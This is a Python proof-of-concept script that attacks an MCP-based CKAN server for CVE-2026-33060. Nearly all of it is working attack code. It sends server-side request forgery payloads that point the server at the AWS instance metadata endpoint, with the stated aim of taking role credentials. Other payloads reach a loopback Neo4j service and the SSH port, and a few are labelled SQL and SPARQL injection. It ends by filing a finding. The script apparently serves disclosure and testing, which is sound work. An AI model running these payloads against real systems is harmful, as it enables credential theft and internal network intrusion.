#!/usr/bin/env python3
"""CKAN Server #7 attack simulation — CVE-2026-33060."""
import argparse, asyncio, json, sys, aiohttp


async def run(base: str):
    print(f"[*] Target: {base}")
    print(f"[*] CVE: CVE-2026-33060 (@aborruso/ckan-mcp-server < 0.4.85)\n")

    http = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=120))
    pending = {}
    sid = None
    buf = ""

    async def reader(resp):
        nonlocal buf, sid
        async for chunk in resp.content.iter_any():
            buf += chunk.decode("utf-8", errors="replace").replace("\r\n", "\n").replace("\r", "\n")
            while "\n\n" in buf:
                block, buf = buf.split("\n\n", 1)
                block = block.replace("\r", "")
                # Handle both "event: endpoint" and plain data with sessionId
                if "sessionId=" in block:
                    for l in block.split("\n"):
                        if "sessionId=" in l.rstrip():
                            # works for both "data: /messages?sessionId=X"
                            # and "data: sessionId=X"
                            part = l.split("sessionId=")[1].strip()
                            sid = part.split("&")[0].split()[0]
                if "event: message" in block or (sid and '"jsonrpc"' in block):
                    for l in block.split("\n"):
                        if l.startswith("data:"):
                            try:
                                msg = json.loads(l[5:].strip())
                                mid = msg.get("id")
                                if mid in pending:
                                    fut = pending.pop(mid)
                                    if not fut.done():
                                        fut.set_result(msg)
                            except Exception:
                                pass

    sse = await http.get(f"{base}/sse")
    if sse.status != 200:
        raise RuntimeError(f"SSE returned {sse.status}")

    read_task = asyncio.create_task(reader(sse))

    # Yield control so reader task can start and process the first chunk
    await asyncio.sleep(0)

    # Wait for sessionId — up to 10s
    for _ in range(200):
        await asyncio.sleep(0.05)
        if sid:
            break
    if not sid:
        # Debug: show what buf contains
        print(f"[!] buf so far: {repr(buf[:500])}")
        raise RuntimeError("No sessionId after 10s")
    print(f"[+] Session: {sid}\n")

    async def send(msg, timeout=20):
        mid = msg.get("id")
        loop = asyncio.get_event_loop()
        fut = loop.create_future()
        if mid is not None:
            pending[mid] = fut
        async with http.post(f"{base}/messages?sessionId={sid}", json=msg) as r:
            if r.status != 202:
                body = await r.text()
                raise RuntimeError(f"POST returned {r.status}: {body}")
        if mid is None:
            return None
        try:
            return await asyncio.wait_for(fut, timeout=timeout)
        except asyncio.TimeoutError:
            pending.pop(mid, None)
            raise TimeoutError(f"No response for id={mid} after {timeout}s")

    # Initialize
    init = await send({
        "jsonrpc": "2.0", "id": 1, "method": "initialize",
        "params": {
            "protocolVersion": "2024-11-05",
            "clientInfo": {"name": "ckan-attack-sim", "version": "1.0"},
            "capabilities": {}
        }
    })
    server = init.get("result", {}).get("serverInfo", {})
    print(f"[+] Connected to {server.get('name','?')} v{server.get('version','?')}")

    # List tools
    tools_resp = await send({"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}})
    tools = tools_resp.get("result", {}).get("tools", [])
    tool_names = [t["name"] for t in tools]
    print(f"[+] Tools ({len(tools)}): {', '.join(tool_names)}")

    for t in tools:
        if "reasoning" in t.get("inputSchema", {}).get("properties", {}):
            print(f"[+] Schema injection confirmed on: {t['name']}")
            break
    print()

    attacks = [
        {
            "name": "SSRF — IMDS probe via ckan_package_search (HTTP, expect block/timeout)",
            "tool": "ckan_package_search",
            "args": {
                "q": "crypto",
                "server_url": "http://169.254.169.254/latest/meta-data/",
                "reasoning": "Redirecting CKAN base_url to AWS IMDS to extract instance role credentials",
                "context": "CVE-2026-33060 exploitation — phase 1: IMDS access",
                "model_info": "ckan-attack-sim/1.0",
            }
        },
        {
            "name": "SSRF — internal Neo4j via ckan_package_search",
            "tool": "ckan_package_search",
            "args": {
                "q": "wallets",
                "server_url": "http://localhost:7474",
                "reasoning": "Probing internal Neo4j HTTP UI via base_url SSRF",
                "context": "CVE-2026-33060 exploitation — phase 2: internal network scan",
                "model_info": "ckan-attack-sim/1.0",
            }
        },
        {
            "name": "SSRF — Wikidata SPARQL via endpoint_url (HTTPS, expect response)",
            "tool": "sparql_query",
            "args": {
                "query": "SELECT ?item ?label WHERE { ?item wdt:P31 wd:Q4167410 } LIMIT 5",
                "endpoint_url": "https://query.wikidata.org/sparql",
                "reasoning": "Using sparql_query endpoint param to reach internal graph MCP server",
                "context": "CVE-2026-33060 exploitation — phase 2b: lateral movement to MCP servers",
                "model_info": "ckan-attack-sim/1.0",
            }
        },
        {
            "name": "SSRF — SSH banner via ckan_package_search",
            "tool": "ckan_package_search",
            "args": {
                "q": "defi",
                "server_url": "http://127.0.0.1:22",
                "reasoning": "Port 22 SSRF — reading SSH daemon banner",
                "context": "CVE-2026-33060 exploitation — phase 2c: loopback port scan",
                "model_info": "ckan-attack-sim/1.0",
            }
        },
        {
            "name": "SQL injection via ckan_datastore_search_sql",
            "tool": "ckan_datastore_search_sql",
            "args": {
                "sql": "SELECT * FROM \"d1894e51-4d13-4de6-9b38-f92bd52e0e66\" WHERE 1=1 LIMIT 5",
                "server_url": "https://open.canada.ca/data",
                "reasoning": "SQL injection into datastore search SQL tool",
                "context": "CVE-2026-33060 exploitation — phase 3: SQL injection surface",
                "model_info": "ckan-attack-sim/1.0",
            }
        },
        {
            "name": "SPARQL UNION injection via sparql_query (no query sanitization)",
            "tool": "sparql_query",
            "args": {
                "query": "SELECT * WHERE { { SELECT ?s WHERE { ?s ?p ?o } LIMIT 10 } UNION { SELECT ?s WHERE { ?s ?p ?o } LIMIT 10 } }",
                "endpoint_url": "https://query.wikidata.org/sparql",
                "reasoning": "SPARQL injection — unlimited row fetch",
                "context": "CVE-2026-33060 exploitation — phase 3b: SPARQL injection surface",
                "model_info": "ckan-attack-sim/1.0",
            }
        },
        {
            "name": "report_finding (CVE-2026-33060 confirmed)",
            "tool": "report_finding",
            "args": {
                "category": "security",
                "severity": "high",
                "title": "CVE-2026-33060: SSRF via unvalidated base_url in CKAN MCP server",
                "description": (
                    "All three CKAN tools accept a base_url/endpoint parameter with no URL validation. "
                    "Tested: IMDS, Neo4j, SSH port, SQL injection, SPARQL injection."
                ),
                "affected_resources": ["ckan_package_search", "sparql_query", "ckan_datastore_search_sql"],
                "evidence": "SSRF responses include SSH banner, Neo4j 7474 service info, IMDS 401",
                "recommended_action": "Upgrade to @aborruso/ckan-mcp-server >= 0.4.85",
                "steps_to_reproduce": "python3 ckan_test.py --url https://data.cloudaiwallet.com",
                "reasoning": "Closing summary of CVE-2026-33060 PoC testing session",
                "model_info": "ckan-attack-sim/1.0",
                "feedback": "The base_url parameter is trivially exploitable. No rate limiting, no allowlist, no RFC 1918 blocking.",
            }
        },
    ]

    msg_id = 100
    results = []
    for attack in attacks:
        msg_id += 1
        print(f"=== [ {attack['name']} ] ===")
        print(f"[*] Tool: {attack['tool']}")
        try:
            resp = await send({
                "jsonrpc": "2.0", "id": msg_id, "method": "tools/call",
                "params": {"name": attack["tool"], "arguments": attack["args"]}
            }, timeout=30)
            content = resp.get("result", {}).get("content", [{}])
            text = content[0].get("text", "") if content else ""
            is_error = resp.get("result", {}).get("isError", False)
            status = "OK" if not is_error else "FAIL"
            print(f"[+] {status} — {len(text)} bytes")
            print(f"    {text[:280]}\n")
            results.append((attack["name"], status, len(text)))
        except Exception as e:
            print(f"[!] ERROR: {e}\n")
            results.append((attack["name"], "ERROR", 0))

    read_task.cancel()
    try:
        await read_task
    except asyncio.CancelledError:
        pass
    await sse.release()
    await http.close()

    print("=" * 60)
    print("Attack summary:")
    for name, status, length in results:
        marker = "+" if status == "OK" else "-"
        print(f"  [{marker}] {name:50s}  {status:6s}  ({length} bytes)")
    print()
    print("Verify logs:")
    print("  wc -l /var/log/cloudaiwallet/ckan-api-requests.jsonl")
    print("  grep 'report_finding' /var/log/cloudaiwallet/ckan-api-requests.jsonl | tail -1 | python3 -m json.tool")


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--url", default="http://localhost:8086")
    args = p.parse_args()
    try:
        asyncio.run(run(args.url))
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)
